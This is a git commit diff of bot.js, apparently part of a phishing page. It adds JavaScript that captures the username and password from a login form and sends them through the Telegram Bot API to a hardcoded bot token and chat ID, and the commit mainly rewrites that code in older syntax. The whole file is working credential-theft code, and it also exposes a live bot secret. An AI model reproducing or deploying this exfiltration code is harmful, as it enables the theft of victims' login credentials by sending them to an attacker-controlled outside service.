8bbde4e3668bfaac84c4a5db5be56968b400eb0d
NotPhishing <sdozki109@gmail.com>
2025-03-04 03:06:38 +0300

    bot.js

--- bot.js
+++ bot.js
@@ -2,24 +2,26 @@ document.getElementById('loginButton').addEventListener('click', function (e) {
   e.preventDefault(); // لمنع الإجراء الافتراضي (إعادة تحميل الصفحة)
 
   // التقاط البيانات من النموذج
-  const username = document.getElementById('username').value;
-  const password = document.getElementById('password').value;
+  var username = document.getElementById('username').value;
+  var password = document.getElementById('password').value;
 
   // إنشاء الرسالة لإرسالها عبر البوت
-  message = New login attempt:\nUsername: ${username}\nPassword: ${password};
+  var message = 'New login attempt:\nUsername: ' + username + '\nPassword: ' + password;
 
   // رابط API البوت الخاص بك مع chat_id الخاص بك
-  const botToken = '7404046910:AAEXGNnbZoh2NiXZLDnrOoaucDiqaGTYfCc';
-  const chatId = '7643313499';
-  const url = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)};
+  var botToken = '7404046910:AAEXGNnbZoh2NiXZLDnrOoaucDiqaGTYfCc';
+  var chatId = '7643313499';
+  var url = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message);
 
   // إرسال البيانات عبر الـ Fetch API
   fetch(url)
-    .then(response => response.json())
-    .then(data => {
+    .then(function(response) {
+      return response.json();
+    })
+    .then(function(data) {
       console.log('Message sent successfully:', data);
     })
-    .catch(error => {
+    .catch(function(error) {
       console.error('Error sending message:', error);
     });
 });
